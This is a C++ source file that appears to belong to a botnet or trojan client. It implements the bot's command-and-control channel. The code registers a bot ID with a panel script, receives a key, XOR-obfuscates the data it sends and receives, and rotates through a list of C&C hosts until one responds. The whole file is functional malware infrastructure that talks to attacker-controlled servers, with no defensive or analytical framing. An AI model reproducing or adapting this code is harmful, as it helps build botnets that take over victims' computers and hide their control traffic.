#include "Panel.h"
#include "Utils.h"
#include "HTTP.h"

static char            *gKey               = NULL;
static char             gBotId[BOT_ID_LEN] = { 0 };
static char             gPath [256]        = { 0 };
static int              gHostIndex         = 0;
static HttpRequestData  gRequest           = { 0 };
static CRITICAL_SECTION gSwitchCritSec;
static CRITICAL_SECTION gInitCritSec;

static void SwitchHost()
{
   Funcs::pEnterCriticalSection(&gSwitchCritSec);
   ++gHostIndex;
   if(!HOST[gHostIndex])
      gHostIndex = 0;
   Funcs::pLeaveCriticalSection(&gSwitchCritSec);
   Funcs::pSleep(POLL);
}

void InitPanelRequest()
{
   Funcs::pInitializeCriticalSection(&gInitCritSec);
}

char *PanelRequest(char *data, int *outputSize)
{
   // if it is the first request (the client dosen't have the encryption key)
   if(!gKey)
   {
      EnterCriticalSection(&gInitCritSec);
      Funcs::pInitializeCriticalSection(&gSwitchCritSec);
      char request[32] = { 0 };
      // write ping command in request body
      Funcs::pLstrcpyA(request, Strs::pingRequest);

      GetBotId(gBotId);

      // /panel/client.php? botid
      Funcs::pLstrcpyA(gPath, PATH);
      Funcs::pLstrcatA(gPath, "?");
      Funcs::pLstrcatA(gPath, gBotId);

      // init request structure
      gRequest.host            = HOST[gHostIndex];
      gRequest.port            = PORT;
      gRequest.path            = gPath;
      gRequest.post            = TRUE;

      // while can't recieve data try next C&C address
      while(!HttpSubmitRequest(gRequest))
      {
         SwitchHost();
         gRequest.host = HOST[gHostIndex];
      }
      // save recived key
      gKey = (char *) gRequest.outputBody;
      LeaveCriticalSection(&gInitCritSec); //useless
   }
   // init request structure (gRequest was initialized earlier)
   HttpRequestData request;
   Funcs::pMemcpy(&request, &gRequest, sizeof(gRequest));

   request.inputBody     = (BYTE *) data;
   request.inputBodySize = Funcs::pLstrlenA(data);

   // encrypt sended data
   Obfuscate(request.inputBody, request.inputBodySize, gKey);

   // while can't recieve a response switch C&C address
   while(!HttpSubmitRequest(request))
   {
      SwitchHost();
      request.host  = HOST[gHostIndex];
      gRequest.host = HOST[gHostIndex];
   }
   // decrypt recived data (encryption and decryption keys are the same because it uses a symmetric encryption algorithm (ordinary xor))
   Obfuscate(request.outputBody, request.outputBodySize, gKey);
   // return recived data
   if(outputSize)
      *outputSize = request.outputBodySize;
   return (char *) request.outputBody;
}
